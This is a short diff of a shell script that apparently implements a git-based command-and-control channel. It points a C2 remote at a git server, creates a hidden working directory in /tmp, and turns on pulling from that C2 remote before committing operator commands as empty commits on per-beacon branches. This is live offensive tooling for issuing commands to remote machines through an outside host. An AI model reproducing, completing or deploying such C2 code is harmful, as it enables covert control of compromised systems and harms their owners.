@@ -87,13 +87,13 @@ init () {
 	trap _cleanup EXIT
 	hash -r
 
-	LOGLEVEL="$((LOGLEVEL + 0))"
-	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
-	POLL_RATE="5"
+	export LOGLEVEL="$((LOGLEVEL + 0))"
+	export C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
+	export POLL_RATE="5"
 	unset CDPATH
 
-	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { logif 4 && fatal "error creating tmpdir"; exit 1; }
-	orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
+	export tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { logif 4 && fatal "error creating tmpdir"; exit 1; }
+	export orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
 	cd -- "${tmpdir}" || { logif 4 && fatal "error changing to tmpdir"; exit 1; }
 
 	_git init
@@ -174,7 +174,7 @@ gitc2-run () {
 		_git checkout -b "${beacon}" || _git checkout "${beacon}"
 		cmd_id="$(git log --author=in --format=%ae | sort -nr | head -1)"
 		cmd_id="$((cmd_id + 1))"
-		# _git pull c2 "${beacon}"
+		_git pull --rebase c2 "${beacon}"
 		GIT_AUTHOR_NAME="in" GIT_AUTHOR_EMAIL="${cmd_id}" \
 			_git commit --allow-empty --message="${cmd}"
 		logif 1 && warn "Beacon '${beacon}': commiting command (${cmd_id}): '${cmd}'"
